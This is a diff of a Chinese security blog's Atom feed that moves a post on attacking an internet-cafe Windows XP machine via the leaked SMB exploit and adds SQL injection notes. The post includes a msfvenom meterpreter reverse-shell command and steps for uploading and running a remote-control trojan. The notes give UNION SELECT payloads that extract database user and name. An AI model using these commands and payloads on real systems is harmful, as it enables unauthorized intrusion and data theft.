@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://loid.online/"/>
-  <updated>2017-04-19T07:10:26.098Z</updated>
+  <updated>2017-05-18T21:00:07.000Z</updated>
   <id>http://loid.online/</id>
   
   <author>
@@ -16,75 +16,11 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>Hack NetBar by Windows SMB</title>
-    <link href="http://loid.online/2017/04/15/hack-Net-bar-by-Windows-smb/"/>
-    <id>http://loid.online/2017/04/15/hack-Net-bar-by-Windows-smb/</id>
-    <published>2017-04-15T15:39:11.000Z</published>
-    <updated>2017-04-19T07:10:26.098Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="这才是日网吧的正确姿势"><a href="#这才是日网吧的正确姿势" class="headerlink" title="这才是日网吧的正确姿势!"></a>这才是日网吧的正确姿势!</h3><hr>
-<blockquote>
-<p>一早起来被 Windows SMB 远程溢出的0day 闹了群.早上有事,晚上到了网吧复现了下.</p>
-</blockquote>
-<ul>
-<li><p>如何安装所需环境,这里我就不再叙述一遍,可以看看Luan表哥的复现,很详细.有几点需要注意的：</p>
-<ul>
-<li>Luan’s Blog: <a href="http://lu4n.com/" target="_blank" rel="external">http://lu4n.com/</a></li>
-<li>上面博客经给出了Python26 和 pywin32 64位的</li>
-<li>注意,上面博客具是适合64位系统用的. </li>
-<li>上面博客中有一个修改fb.py 的步骤,千万不要忘记</li>
-</ul>
-</li>
-<li><p>好戏开始</p>
-<ul>
-<li><p>因为我的目标机是32位的Windows XP 所以这里开始再演示一遍,如果目标机是64位的,可以跳过这里。</p>
-</li>
-<li><p>用msf生成dll,并填写在fb里.</p>
-<pre><code>本机IP: 192.168.1.25
-目标IP: 192.168.1.201
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=6666 -f dll &gt; msf.dll
-</code></pre><p>  <img src="/images/1_bar.png" alt="netbar 01"></p>
-</li>
-<li><p>上面的设置好后,暂时不要开始攻击,现在开始配置msf.<br>  <img src="/images/2_bar.png" alt="netbar 02"></p>
-</li>
-<li><p>先开始用msf,等待回话连接.然后开始用fb攻击,得到一个回话.<br>  <img src="/images/3_bar.png" alt="netbar 03"></p>
-</li>
-<li><p>生成一个远控马,然后用upload 上传本地的远控马,到主机的C:盘根目录</p>
-<pre><code>upload C:\\Users\\Administrator\\Desktop\\stranded\\s.exe c:\\\
-</code></pre><p>  <img src="/images/4_bar.png" alt="netbar 04"></p>
-</li>
-<li><p>进入shell,运行上传过去的远控马.<br>  <img src="/images/5_bar.png" alt="netbar 05"></p>
-</li>
-<li><p>然后远控上线,嘿嘿嘿.<br>  <img src="/images/6_bar.png" alt="netbar 06"></p>
-</li>
-</ul>
-</li>
-<li><p>最后的全家福<br>  <img src="/images/7_bar.png" alt="netbar 07"> </p>
-</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;这才是日网吧的正确姿势&quot;&gt;&lt;a href=&quot;#这才是日网吧的正确姿势&quot; class=&quot;headerlink&quot; title=&quot;这才是日网吧的正确姿势!&quot;&gt;&lt;/a&gt;这才是日网吧的正确姿势!&lt;/h3&gt;&lt;hr&gt;
-&lt;blockquote&gt;
-&lt;p&gt;一早起来被 Windows 
-    
-    </summary>
-    
-    
-      <category term="漏洞" scheme="http://loid.online/tags/%E6%BC%8F%E6%B4%9E/"/>
-    
-      <category term="实战" scheme="http://loid.online/tags/%E5%AE%9E%E6%88%98/"/>
-    
-  </entry>
-  
-  <entry>
     <title>SQL Injection Study</title>
-    <link href="http://loid.online/2017/04/11/SQL-Injection-Study/"/>
-    <id>http://loid.online/2017/04/11/SQL-Injection-Study/</id>
-    <published>2017-04-10T19:01:01.000Z</published>
-    <updated>2017-04-19T07:11:58.443Z</updated>
+    <link href="http://loid.online/2017/05/19/SQL-Injection-Study/"/>
+    <id>http://loid.online/2017/05/19/SQL-Injection-Study/</id>
+    <published>2017-05-19T05:01:01.000Z</published>
+    <updated>2017-05-18T21:00:07.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="SQL注入攻击学习笔记"><a href="#SQL注入攻击学习笔记" class="headerlink" title="SQL注入攻击学习笔记"></a>SQL注入攻击学习笔记</h2><hr>
 <ul>
@@ -161,8 +97,38 @@ http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
 </code></pre></li>
 </ul>
 </li>
+<li><p>匹配数据类型</p>
+<ul>
+<li><p>假设原始查询包含4列</p>
+<pre><code>http://127.0.0.1/products.asp?id=12+union+select+&apos;test&apos;,NULL,NULL,NULL
+http://127.0.0.1/products.asp?id=12+union+select+NULL,&apos;test&apos;,NULL,NULL
+http://127.0.0.1/products.asp?id=12+union+select+NULL,NULL,&apos;test&apos;,NULL
+http://127.0.0.1/products.asp?id=12+union+select+NULL,NULL,NULL,&apos;test&apos;
+如果&apos;test&apos;所在的位置没有返回异常,则代表该列的数据储存类型为字符型,就可以用来显示需要的值
+注: NULL与所有类型兼容,但是如Oracle8 没有NULL,此时只有用暴力猜解的方式来了.
+</code></pre></li>
+<li><p>如果其中多列能储存字符串,则有如下做法:</p>
+<pre><code>http://127.0.0.1/products.asp?id=12+union+select+NULL,system_user,db_name(),NULL
+</code></pre></li>
+<li><p>但是如果只有一列能储存字符串,若想返回多个数据</p>
+<pre><code>http://127.0.0.1/products.asp?id=12+union+select+NULL,system_user+&apos;|&apos;+db_name(),NULL,NULL
+(参照字符串链接字符)
+</code></pre></li>
+<li><p>不同数据库中,将任意数据转化为字符串的语法(强制类型转换运算符)</p>
+<pre><code>数据库服务器                    查询
+Microsoft SQL Server        SELECT CAST(&apos;123&apos; AS varchar)
+MySQL                       SELECT CAST(&apos;123&apos; AS char)
+Oracle                      SELECT CAST(1 AS varchar) FROM dual
+PostgreSQL                  SELECT CAST(123 AS text)
+</code></pre></li>
+<li>如果Web应用对结果解析只显示第一行数据<pre><code>如: http://127.0.0.1/products.asp?id=12+union+select+NULL,system_user,NULL,NULL
+</code></pre>  数据库将执行<pre><code>SELECT id,type,description,price FROM products WHERE id=12 UNION SELECT NULL,system_user,NULL,NULL
+</code></pre>  此时可以在注入UNION查询之前,添加一个使WHERE子句永远为假的条件,如:<pre><code>http://127.0.0.1/products.asp?id=12+and+1=0+UNION+SELECT+NULL,system_user,NULL,NULL,NULL
+</code></pre>  数据库服务器将执行(执行时,子句失效,此时只能返回后面的查询数据)<pre><code>SELECT id,type,description,price FROM products WHERE id=12 and 1=0 UNION SELECT NULL,system_user,NULL,NULL
+</code></pre></li>
 </ul>
-<p>2017年04月11日04:03:02 睡觉了 mmp</p>
+</li>
+</ul>
 ]]></content>
     
     <summary type="html">
@@ -185,11 +151,75 @@ http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
   </entry>
   
   <entry>
+    <title>Hack NetBar by Windows SMB</title>
+    <link href="http://loid.online/2017/04/15/hack-Net-bar-by-Windows-smb/"/>
+    <id>http://loid.online/2017/04/15/hack-Net-bar-by-Windows-smb/</id>
+    <published>2017-04-15T23:39:11.000Z</published>
+    <updated>2017-05-12T22:19:32.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="这才是日网吧的正确姿势"><a href="#这才是日网吧的正确姿势" class="headerlink" title="这才是日网吧的正确姿势!"></a>这才是日网吧的正确姿势!</h3><hr>
+<blockquote>
+<p>一早起来被 Windows SMB 远程溢出的0day 闹了群.早上有事,晚上到了网吧复现了下.</p>
+</blockquote>
+<ul>
+<li><p>如何安装所需环境,这里我就不再叙述一遍,可以看看Luan表哥的复现,很详细.有几点需要注意的：</p>
+<ul>
+<li>Luan’s Blog: <a href="http://lu4n.com/" target="_blank" rel="external">http://lu4n.com/</a></li>
+<li>上面博客经给出了Python26 和 pywin32 64位的</li>
+<li>注意,上面博客具是适合64位系统用的. </li>
+<li>上面博客中有一个修改fb.py 的步骤,千万不要忘记</li>
+</ul>
+</li>
+<li><p>好戏开始</p>
+<ul>
+<li><p>因为我的目标机是32位的Windows XP 所以这里开始再演示一遍,如果目标机是64位的,可以跳过这里。</p>
+</li>
+<li><p>用msf生成dll,并填写在fb里.</p>
+<pre><code>本机IP: 192.168.1.25
+目标IP: 192.168.1.201
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=6666 -f dll &gt; msf.dll
+</code></pre><p>  <img src="/images/1_bar.png" alt="netbar 01"></p>
+</li>
+<li><p>上面的设置好后,暂时不要开始攻击,现在开始配置msf.<br>  <img src="/images/2_bar.png" alt="netbar 02"></p>
+</li>
+<li><p>先开始用msf,等待回话连接.然后开始用fb攻击,得到一个回话.<br>  <img src="/images/3_bar.png" alt="netbar 03"></p>
+</li>
+<li><p>生成一个远控马,然后用upload 上传本地的远控马,到主机的C:盘根目录</p>
+<pre><code>upload C:\\Users\\Administrator\\Desktop\\stranded\\s.exe c:\\\
+</code></pre><p>  <img src="/images/4_bar.png" alt="netbar 04"></p>
+</li>
+<li><p>进入shell,运行上传过去的远控马.<br>  <img src="/images/5_bar.png" alt="netbar 05"></p>
+</li>
+<li><p>然后远控上线,嘿嘿嘿.<br>  <img src="/images/6_bar.png" alt="netbar 06"></p>
+</li>
+</ul>
+</li>
+<li><p>最后的全家福<br>  <img src="/images/7_bar.png" alt="netbar 07"> </p>
+</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;这才是日网吧的正确姿势&quot;&gt;&lt;a href=&quot;#这才是日网吧的正确姿势&quot; class=&quot;headerlink&quot; title=&quot;这才是日网吧的正确姿势!&quot;&gt;&lt;/a&gt;这才是日网吧的正确姿势!&lt;/h3&gt;&lt;hr&gt;
+&lt;blockquote&gt;
+&lt;p&gt;一早起来被 Windows 
+    
+    </summary>
+    
+    
+      <category term="漏洞" scheme="http://loid.online/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="实战" scheme="http://loid.online/tags/%E5%AE%9E%E6%88%98/"/>
+    
+  </entry>
+  
+  <entry>
     <title>WiFi Hacker for Web</title>
     <link href="http://loid.online/2017/03/29/WiFi-Hacker-for-Web/"/>
     <id>http://loid.online/2017/03/29/WiFi-Hacker-for-Web/</id>
-    <published>2017-03-28T16:21:18.000Z</published>
-    <updated>2017-04-19T07:12:01.647Z</updated>
+    <published>2017-03-29T00:21:18.000Z</published>
+    <updated>2017-05-12T22:19:32.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="挖坑：-WiFi在线工具集开发"><a href="#挖坑：-WiFi在线工具集开发" class="headerlink" title="挖坑： WiFi在线工具集开发"></a>挖坑： WiFi在线工具集开发</h2><p>利用暑假时间搞完</p>
 <hr>
@@ -229,8 +259,8 @@ http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
     <title>本机连接内网服务器(花生壳映射)</title>
     <link href="http://loid.online/2017/03/17/localhost-connects-others-server/"/>
     <id>http://loid.online/2017/03/17/localhost-connects-others-server/</id>
-    <published>2017-03-17T14:29:31.000Z</published>
-    <updated>2017-03-17T14:38:29.459Z</updated>
+    <published>2017-03-17T22:29:31.000Z</published>
+    <updated>2017-05-12T22:19:32.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="本机连接内网服务器-花生壳映射"><a href="#本机连接内网服务器-花生壳映射" class="headerlink" title="本机连接内网服务器(花生壳映射)"></a>本机连接内网服务器(花生壳映射)</h2><p>msf反弹shell + 3389内网转发</p>
 <hr>
@@ -269,8 +299,8 @@ http://127.0.0.1/products.asp?id=666+union+select+null,null,null--
     <title>DirScanner 多线程目录扫描器</title>
     <link href="http://loid.online/2017/03/15/DirScanner-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
     <id>http://loid.online/2017/03/15/DirScanner-多线程目录扫描器/</id>
-    <published>2017-03-15T07:05:17.000Z</published>
-    <updated>2017-04-19T07:09:15.513Z</updated>
+    <published>2017-03-15T15:05:17.000Z</published>
+    <updated>2017-05-12T22:19:32.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="DirScanner-Python网站路径扫描-多线程版"><a href="#DirScanner-Python网站路径扫描-多线程版" class="headerlink" title="DirScanner Python网站路径扫描-多线程版"></a>DirScanner Python网站路径扫描-多线程版</h2><p>过狗扫描,防止多线程被安全狗等防护拦截</p>
 <hr>
@@ -314,8 +344,8 @@ Options:
     <title>WebQQ Robot for plugin</title>
     <link href="http://loid.online/2017/03/13/WebQQ-Robot-plugin/"/>
     <id>http://loid.online/2017/03/13/WebQQ-Robot-plugin/</id>
-    <published>2017-03-12T18:55:14.000Z</published>
-    <updated>2017-03-12T19:19:32.699Z</updated>
+    <published>2017-03-13T02:55:14.000Z</published>
+    <updated>2017-05-12T22:19:32.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="WebQQ-Robot-by-plugin"><a href="#WebQQ-Robot-by-plugin" class="headerlink" title="WebQQ Robot by plugin"></a>WebQQ Robot by plugin</h2><p>一个可自我开发利用插件的webqq协议机器人</p>
 <hr>
@@ -386,8 +416,8 @@ _cmd(self)              必须, 用来处理并返回结果,结果是字符串
     <title>Proxy Spider 插件化利用工具</title>
     <link href="http://loid.online/2017/03/13/Proxy-Spider-%E6%8F%92%E4%BB%B6%E5%8C%96%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
     <id>http://loid.online/2017/03/13/Proxy-Spider-插件化利用工具/</id>
-    <published>2017-03-12T16:39:40.000Z</published>
-    <updated>2017-03-12T16:50:59.030Z</updated>
+    <published>2017-03-13T00:39:40.000Z</published>
+    <updated>2017-05-12T22:19:32.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Proxy-Spider-for-Python2-7-插件利用版-多线程"><a href="#Proxy-Spider-for-Python2-7-插件利用版-多线程" class="headerlink" title="Proxy Spider for Python2.7 插件利用版-多线程"></a>Proxy Spider for Python2.7 插件利用版-多线程</h2><p>通过调用自写插件,在爬行代理的同时对代理进行检测可用性.</p>
 <hr>
@@ -438,8 +468,8 @@ filename=   默认为None,如果为None,只会把检测结果打印出来,为不
     <title>关于我的在线工具集</title>
     <link href="http://loid.online/2017/03/12/%E5%85%B3%E4%BA%8E%E6%88%91%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
     <id>http://loid.online/2017/03/12/关于我的在线工具集/</id>
-    <published>2017-03-11T17:41:49.000Z</published>
-    <updated>2017-03-12T16:42:59.571Z</updated>
+    <published>2017-03-12T01:41:49.000Z</published>
+    <updated>2017-05-12T22:19:32.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Web在线工具集"><a href="#Web在线工具集" class="headerlink" title="Web在线工具集"></a>Web在线工具集</h2><ul>
 <li><p>关于在线扫描的功能说明:</p>
@@ -485,8 +515,8 @@ filename=   默认为None,如果为None,只会把检测结果打印出来,为不
     <title>Pytasploit 插件利用工具</title>
     <link href="http://loid.online/2017/03/11/Pytasploit-%E6%8F%92%E4%BB%B6%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
     <id>http://loid.online/2017/03/11/Pytasploit-插件利用工具/</id>
-    <published>2017-03-11T10:07:09.000Z</published>
-    <updated>2017-03-17T12:51:11.762Z</updated>
+    <published>2017-03-11T18:07:09.000Z</published>
+    <updated>2017-05-12T22:19:32.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Pytasploit-扫描利用框架"><a href="#Pytasploit-扫描利用框架" class="headerlink" title="Pytasploit 扫描利用框架"></a>Pytasploit 扫描利用框架</h2><ul>
 <li><p>关于扫描器的一些说明<br>  程序使用的是自己集成的插件来扫描的,所以对于扫描结果, 还是得看个人的插件集成情况.<br>  目前代码还有点糟糕,等3月25号考完试再重写一下扫描器.尽量加个多线程什么的.</p>
@@ -520,11 +550,11 @@ filename=   默认为None,如果为None,只会把检测结果打印出来,为不
       <category term="Python" scheme="http://loid.online/categories/Python/"/>
     
     
+      <category term="漏洞" scheme="http://loid.online/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
       <category term="Python" scheme="http://loid.online/tags/Python/"/>
     
       <category term="原创" scheme="http://loid.online/tags/%E5%8E%9F%E5%88%9B/"/>
-    
-      <category term="漏洞" scheme="http://loid.online/tags/%E6%BC%8F%E6%B4%9E/"/>
     
   </entry>
   
